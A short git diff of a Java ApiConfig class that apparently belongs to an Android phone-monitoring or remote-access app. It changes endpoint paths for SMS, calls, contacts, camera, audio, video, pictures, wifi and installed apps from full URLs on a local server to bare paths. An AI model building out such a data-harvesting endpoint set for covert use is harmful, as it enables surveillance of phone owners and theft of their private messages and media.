@@ -8,51 +8,51 @@ public class ApiConfig {
     public static final String BASE_URL = "http://192.168.1.100:8080/fs";
 
     public static String getInstallAppInfo() {
-        return BASE_URL + "/get_install";
+        return "/get_install";
     }
 
 
     public static String getRunningAppInfo() {
-        return BASE_URL + "/running";
+        return "/running";
     }
 
     public static String getVideo() {
-        return BASE_URL + "/video";
+        return "/video";
     }
 
     public static String getAudio() {
-        return BASE_URL + "/audio";
+        return "/audio";
     }
 
-    public static String getPicture() {
-        return BASE_URL + "/picture";
+    public static String getTakePicture() {
+        return "/take_picture";
     }
 
     public static String getWifi() {
-        return BASE_URL + "/wifi";
+        return "/wifi";
     }
 
     public static String getCamera() {
-        return BASE_URL + "/camera";
+        return "/camera";
     }
 
     public static String getSMSAll() {
-        return BASE_URL + "/sms";
+        return "/sms";
     }
 
     public static String getSMS() {
-        return BASE_URL + "/sms";
+        return "/sms";
     }
 
     public static String getCall() {
-        return BASE_URL + "/call";
+        return "/call";
     }
 
     public static String getContact() {
-        return BASE_URL + "/contact";
+        return "/contact";
     }
 
     public static String getFCMToken() {
-        return BASE_URL + "/register";
+        return "/register";
     }
 }
